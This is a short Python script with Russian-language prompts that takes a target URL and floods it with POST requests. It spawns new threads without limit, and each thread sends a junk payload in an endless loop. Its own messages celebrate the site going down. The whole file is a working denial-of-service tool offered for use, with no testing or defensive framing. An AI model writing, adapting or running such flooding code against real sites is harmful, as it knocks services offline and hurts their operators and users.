import requests
import threading
import colorama

payload = {'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool",'lool': "lool"}

url = input("Введите URL : ")

def dos(target):
    while True:
        try:
            res = requests.post(target, data=payload)
            print(colorama.Fore.YELLOW + "Запрос отправлен!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка подключения!\nВозможно сайт больше не работает.")


i=0
while True:
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " потков начато!")
    i+=1
